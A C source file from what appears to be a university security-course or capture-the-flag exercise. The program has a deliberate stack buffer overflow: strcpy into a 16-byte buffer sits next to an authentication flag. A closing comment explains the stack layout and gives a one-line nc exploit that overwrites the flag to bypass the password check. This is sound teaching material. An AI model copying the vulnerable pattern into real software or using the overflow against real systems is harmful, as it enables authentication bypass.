#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include "../general.h"

int very_complex_function(char* password) {
  int result;
  char buffer[16];

  result = 0;
  strcpy(buffer, password);

  if(strcmp(buffer, getflag()) == 0)
    result = 1;

  return result;
}



int main() {
  init();

  char pass[64] = {0};
  read(0, pass, 63);

  if(very_complex_function(pass)){
      printf("Welcome back! Here is your token: %s\n", getflag());
  } else {
      printf("Unauthorized user/passwd\n");
  }
}


/*

Similar to the exercise 3-Return Address.

After drawing the stack we realise that the buffer is stored after the variable result so we can overwrite result.

The result variable is at 0xbfffeedc and the buffer is at 0xbfffeecc

So we need to write (0xbfffeedc - 0xbfffeecc) = 16 bytes plus the value 1 which will be \x01\x00\x00\x00


python -c "print 'A'*16 + '\x01\x00\x00\x00'" | nc mustard.stt.rnl.tecnico.ulisboa.pt 9994



*/
